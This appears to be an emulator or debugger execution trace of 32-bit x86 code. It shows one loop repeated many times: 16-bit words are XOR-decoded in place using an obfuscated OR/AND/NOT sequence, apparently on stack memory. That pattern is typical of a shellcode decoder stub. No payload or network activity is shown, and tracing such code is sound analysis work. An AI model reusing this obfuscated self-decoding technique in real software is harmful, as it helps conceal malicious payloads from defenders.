>>    122: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    123: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    124: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    125: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    126: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    127: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    128: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    129: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    130: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    131: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    132: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    133: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    134: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    135: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    136: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    137: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    138: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    139: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    140: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    141: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    142: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    143: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    144: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    145: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    146: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    147: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    148: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    149: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    150: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    151: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    152: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    153: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    154: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    155: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    156: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    157: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    158: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    159: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    160: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    161: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    162: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    163: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    164: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    165: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    166: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    167: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    168: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    169: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    170: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    171: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    172: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    173: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    174: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    175: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    176: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    177: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    178: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    179: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    180: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    181: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    182: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    183: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    184: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    185: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    186: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    187: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    188: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    189: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    190: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    191: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    192: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    193: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    194: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    195: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    196: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    197: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    198: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    199: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    200: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    201: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    202: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    203: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    204: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    205: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    206: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    207: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    208: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    209: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    210: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    211: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    212: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    213: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    214: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    215: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    216: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    217: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    218: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    219: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    220: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    221: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    222: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    223: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    224: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    225: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    226: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    227: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    228: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    229: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    230: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    231: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    232: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    233: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    234: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    235: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    236: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    237: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    238: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    239: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    240: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    241: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    242: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    243: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    244: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    245: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    246: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    247: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    248: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    249: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    250: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    251: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    252: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    253: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    254: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    255: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    256: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    257: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    258: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    259: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    260: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    261: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    262: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    263: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    264: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    265: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    266: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    267: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    268: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    269: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    270: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    271: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    272: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    273: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    274: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    275: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    276: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    277: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    278: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    279: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    280: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    281: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    282: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    283: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    284: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    285: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    286: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    287: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    288: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    289: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    290: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    291: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    292: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    293: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    294: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    295: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    296: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    297: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    298: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    299: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    300: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    301: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    302: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    303: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    304: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    305: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    306: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    307: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    308: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    309: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    310: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    311: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    312: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    313: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    314: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    315: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    316: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    317: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    318: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    319: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    320: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    321: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    322: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    323: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    324: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    325: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    326: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    327: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    328: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    329: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    330: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    331: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    332: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    333: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    334: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    335: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    336: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    337: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    338: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    339: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    340: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    341: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    342: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    343: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    344: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    345: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    346: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    347: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    348: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    349: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    350: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    351: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    352: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    353: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    354: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    355: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    356: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    357: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    358: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    359: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    360: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    361: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    362: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    363: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    364: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    365: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    366: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    367: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    368: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    369: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    370: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    371: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    372: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    373: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    374: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    375: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    376: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    377: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    378: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    379: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    380: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    381: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    382: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    383: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    384: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    385: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    386: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    387: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    388: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    389: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    390: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    391: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    392: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    393: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
